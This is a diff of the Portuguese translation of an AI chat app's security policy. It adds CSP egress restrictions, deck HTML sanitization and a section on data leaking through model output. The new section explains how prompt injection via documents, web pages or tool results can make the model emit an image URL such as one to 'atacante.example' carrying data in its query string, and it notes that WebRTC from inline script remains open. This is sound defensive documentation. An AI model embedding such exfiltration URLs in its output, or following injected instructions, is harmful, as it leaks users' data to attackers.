@@ -1,4 +1,4 @@
-<!-- i18n: source=SECURITY.md source-hash=71a2a491dbb642eb1b649e4c64a10acc57a07267 status=current -->
+<!-- i18n: source=SECURITY.md source-hash=18f0f25e43d27d80aaafee200dac8b01d846af37 status=current -->
 # Política de Segurança
 
 [English](../../SECURITY.md) · **Português (Brasil)** · [Español](../es/SECURITY.md)
@@ -114,17 +114,11 @@ outra pessoa ainda age como ela; isso é o modelo de qualquer bearer token.
 | Proteção | Onde | O que bloqueia |
 |---|---|---|
 | **CSRF** | `server/csrfGuard.ts`, em `/api/*` antes do parse do corpo | `POST`/`PUT`/`PATCH`/`DELETE` vindos de outro site: passa com `Sec-Fetch-Site` `same-origin`/`none`, ou com `Origin` (ou, sem ele, `Referer`) cujo host é o da requisição (`Host`/`X-Forwarded-Host`) ou o de `DATABRICKS_APP_URL`, comparando esquema, host e porta, com a porta padrão normalizada (`:443` em https, `:80` em http; outra porta, ou o mesmo host e porta no outro esquema, é outra origem). Requisição sem nenhum dos três cabeçalhos (curl, scripts, `npm run smoke`) passa: não vem de navegador. O resto recebe **403** `{"code":"cross_site_request"}`. Motivo: `/api/chat` aceita `multipart/form-data`, que um `<form>` de outro site envia sem preflight |
-| **Cabeçalhos** | `server/securityHeaders.ts` | `X-Content-Type-Options: nosniff`, `Referrer-Policy: same-origin`, `X-Frame-Options: SAMEORIGIN`, sem `X-Powered-By` e uma CSP conservadora: `frame-ancestors 'self'; base-uri 'self'; object-src 'none'; form-action 'self'` |
+| **Cabeçalhos** | `server/securityHeaders.ts` | `X-Content-Type-Options: nosniff`, `Referrer-Policy: same-origin`, `X-Frame-Options: SAMEORIGIN`, sem `X-Powered-By` e uma CSP aplicada: `frame-ancestors 'self'; base-uri 'self'; object-src 'none'; form-action 'self'; default-src 'self'; script-src 'self' 'unsafe-inline'` mais as diretivas de egress (`img-src`, `font-src`, `style-src`, `media-src`, `connect-src`, `frame-src`); `CSP_EGRESS=report` tira as de egress e as de script |
 | **Ids numéricos** | `app.param(['id','messageId'])` | Id fora de `^\d{1,18}$` pula a rota e termina em 404, em vez de chegar ao Postgres e voltar como 500 com a mensagem do driver |
 | **Erro final** | `finalErrorHandler` (último middleware) | Erro que nenhuma rota tratou (JSON malformado, corpo ou upload grande demais, exceção) vira JSON genérico (`bad_request` 400, `payload_too_large` 413, `internal_error` 500); o detalhe vai só para o log. As rotas que já tratam o próprio erro não mudaram |
 
-**Por que a CSP não restringe scripts, estilos nem imagens.** Iframes `srcdoc` herdam a
-CSP da página. O editor de slide injeta um `<script>` inline no iframe, e o design system
-importado traz scripts inline, estilos e fontes/imagens de qualquer host. Uma
-`script-src`/`style-src`/`img-src`/`font-src` quebraria o preview e a edição de decks
-(verificado no Chrome contra o SPA compilado: com a CSP acima não há violação, e script
-inline, estilo e fonte rodam em iframes `srcdoc` com e sem sandbox). Apertar a CSP exige
-servir esses iframes de uma origem própria antes. HSTS e TLS ficam com o proxy do Apps.
+**O que a CSP restringe nos scripts e o que ela não consegue.** Iframes `srcdoc` herdam a CSP da página. O editor de slide injeta um `<script>` inline no iframe e o design system importado traz scripts inline, então `script-src` é `'self' 'unsafe-inline'`: script inline continua funcionando, mas um script **remoto** (`<script src=https://host/x.js?d=<dados>>`, seja um card do design system que o injeta ou um slide que o passa pelo sanitizador) é bloqueado e reportado. Nem `default-src` nem `script-src` aceitam jamais uma origem da lista permitida, `blob:`, `'unsafe-eval'` ou `*`: um CDN de scripts serve código que qualquer um publica, então um design system que precise de uma biblioteca deve embuti-la no zip. Navegar um frame com sandbox para um host externo é bloqueado pelo `frame-src 'self' blob:` aplicado (sondado no Chromium: nenhuma requisição chegou ao listener). O que continua aberto enquanto script inline roda num frame com sandbox é o WebRTC: na mesma sonda, um pacote STUN do frame chegou a um listener de loopback. Fechá-lo exige servir esses iframes de uma origem própria, com política própria. HSTS e TLS ficam com o proxy do Apps.
 
 **Depende do proxy:** o `SameSite` do cookie de sessão do Apps e se o proxy acrescenta
 os próprios cabeçalhos de segurança não foram verificados. O guard de CSRF não depende
@@ -243,7 +237,7 @@ parser. É JS puro e roda no servidor sem DOM. DOMPurify precisaria de um DOM no
 | Onde | Sandbox | Avaliação |
 |---|---|---|
 | `DeckTemplateInspector.tsx:120,131` e a miniatura sem `previewCardHtml` (`DeckTemplatesSettings.tsx`) | `allow-scripts` | Aceitável. Os scripts do DS rodam com origem opaca (sem cookie, sem `/api` do app, sem navegar o topo nem abrir pop-ups). Eles ainda podem fazer requisições de rede para fora, mas o que está no frame é só o próprio DS. |
-| `deck/HtmlSlideFrame.tsx:138`, `deck/HtmlSlideEditor.tsx:838` | `allow-scripts` | **Follow-up.** O HTML dos slides vem do modelo, e o servidor (`sanitizeHtmlDeck`, `server/blocks.ts:75`) só remove `<script>…</script>` por regex: atributos `on*` sobrevivem e rodam nesses frames. A origem é opaca (sem acesso à API), mas um slide gerado por injeção de prompt pode mandar o conteúdo do slide para fora e, no editor, enviar uma mensagem `html` que o pai aceita (`e.source` confere) e grava no próprio deck. Correção proposta: sanitizar o HTML do deck no servidor com a mesma biblioteca (o runtime do editor é injetado pelo cliente, então o conteúdo pode ficar sem handlers) e uma CSP com `connect-src`. |
+| `deck/HtmlSlideFrame.tsx`, `deck/HtmlSlideEditor.tsx` | `allow-scripts` | Aceitável com as camadas abaixo. O HTML do slide vem do modelo. O servidor (`sanitizeHtmlDeck`, `server/blocks.ts`) o sanitiza com o sanitizador por lista de permissões a cada gravação e a cada leitura (manipuladores, URLs `javascript:`, `<base>`, `<meta http-equiv>`, `<link>`, frames e formulários, `src`, `srcset`, `url()` e `@import` remotos), e a CSP aplicada bloqueia carregamentos remotos, scripts remotos e `connect-src`. A origem é opaca (sem acesso à API). Segue aberto: WebRTC a partir de script inline (veja o parágrafo da CSP acima). |
 | `lib/domToSlideOps.ts:476`, `allow-same-origin`, sem scripts | `allow-same-origin` | Aceitável. Frame oculto para medir o layout na exportação. Os scripts e handlers não rodam, e nenhum nó do frame é movido para o documento principal. Não acrescente `allow-scripts` aqui: com `allow-same-origin` isso dá acesso total ao app. |
 | `HtmlDeckPreview.tsx:53`, `allow-same-origin`, sem scripts | `allow-same-origin` | Aceitável, mesma regra. O componente não é importado em lugar nenhum (código morto, candidato a remoção). |
 
@@ -252,13 +246,31 @@ parser. É JS puro e roda no servidor sem DOM. DOMPurify precisaria de um DOM no
 inspecione o `<iframe>` produzido.
 
 O que isso **não** cobre: o próprio DS continua sendo conteúdo confiável para o prompt
-(um DS global influencia os decks de todos), e a CSP do app (acima) não restringe
-scripts, estilos, imagens nem `connect-src` nesses iframes.
+(um DS global influencia os decks de todos), e a CSP do app (acima) bloqueia
+scripts remotos, imagens, fontes, estilos e `connect-src` nesses iframes, mas ainda permite script inline: o WebRTC continua aberto (a navegação do frame para um host externo é bloqueada pelo `frame-src`).
 
 Quando o app busca uma URL escolhida pelo modelo (ferramenta de página web), a conexão
 só segue para endereços públicos: loopback, redes privadas, CGNAT, link-local (incluindo o
 endpoint de metadados de nuvem), ULA e reservados ficam bloqueados, em cada salto de
 redirecionamento. A mesma regra está em `server/a2aGuard.ts`, que será usado pelo A2A.
+
+## Dados saindo pela saída do modelo (2.0.0)
+
+O texto que o modelo escreve pode ser induzido pelo que ele lê (um documento, uma página web, um resultado de MCP ou do Genie). Uma URL nesse texto pode carregar dados: `![x](https://atacante.example/p.png?d=<dados>)` faz o navegador chamar o host sem nenhum clique, e o mesmo vale para uma fonte, folha de estilo ou script remoto em um documento, slide ou cartão de design system. **Versões anteriores à 2.0.0 estão expostas a isso. Atualize para a 2.0.0.**
+
+A 2.0.0 fecha isso em camadas:
+
+- **CSP aplicada** (`server/securityHeaders.ts`): imagens, fontes, estilos, mídia, conexões e frames só carregam do app, `data:` e `blob:`; `script-src 'self' 'unsafe-inline'` bloqueia scripts remotos. Um único cabeçalho cobre todo frame `srcdoc` (documentos, slides, exportação, impressão), streaming e mensagens antigas.
+- **Lista de origens.** Um admin adiciona origens em Configurações > Administradores > *Origens externas de recursos* (gravadas em `app_settings.external_asset_origins`, valem em cerca de 15 s, auditadas como `egress.settings`); `EXTERNAL_ASSET_ORIGINS` no `app.yaml` é um piso. As entradas são `https://host[:porta]`, sem curinga, caminho nem IP, nunca o app, o workspace ou hosts da Databricks. Abrem só `img-src`, `font-src` e `style-src`; nunca `connect-src`, `media-src`, `frame-src`, `default-src` nem `script-src`.
+- **Marcador** para imagem externa em resposta do chat ou documento (host visível, sem "carregar mesmo assim").
+- **Sanitizador de decks** ao salvar e ao ler, cópias de conversas incluídas; o importador de design system avisa sobre as referências externas que remove.
+- **Procedência do `web_fetch`**: só uma URL que o usuário digitou ou que um resultado de `web_search`/`web_fetch` listou. Outros resultados de ferramenta não são fonte.
+- **Rotas de bytes de artefatos** (imagens, exportações): CSP de sandbox e `nosniff` em todas; `Content-Disposition: attachment` em downloads, exportações e imagens armazenadas que não são raster (como SVG). Uma imagem raster (PNG, JPEG...) que `/api/images/:id` serve para `<img>` continua inline.
+- **Logs**: `egress_blocked` e `csp_violation`. Valores que carregam URL nunca mantêm caminho nem query: `egress_blocked.hosts` guarda nomes de host, e `csp_violation.blocked` guarda uma origem (esquema, host e porta não padrão) ou uma palavra-chave da CSP como `inline`, `eval`, `data`, `blob`; o valor é cortado em 120 caracteres, então uma origem muito longa pode ser truncada, sem marcador. Campos: `egress_blocked` tem `surface`, `kind`, `hosts`, `count`, `route` e `truncated` só quando verdadeiro; `csp_violation` tem `directive`, `blocked`, `disposition` e `document` só para um frame `about:srcdoc` ou `about:blank`; o logger acrescenta `request_id`, `user_hash` e `route`. Veja [docs/operations.md](operations.md#617-csp-de-saída-200-permitir-uma-origem-interruptor-de-emergência-ler-os-logs).
+
+`CSP_EGRESS=report` (exatamente esse valor, no `app.yaml`, mesmo build) reverte só a parte do navegador para report-only. O marcador, o sanitizador, a regra do `web_fetch` e a regra do prompt seguem ligados.
+
+**O que isto não cobre.** Argumentos de ferramentas não são um caminho do navegador: mantenha restritiva a política de rede serverless (sem rede de saída para a ferramenta Python), revise quais ferramentas MCP externas podem escrever ou publicar e desative as desnecessárias, e lembre que a consulta da busca web vai ao provedor que o admin escolheu. O WebRTC a partir de script inline em frames isolados segue aberto até que esses frames tenham origem e política próprias (a navegação do frame é bloqueada por `frame-src`).
 
 ## Imagens geradas (UC Volume)
 
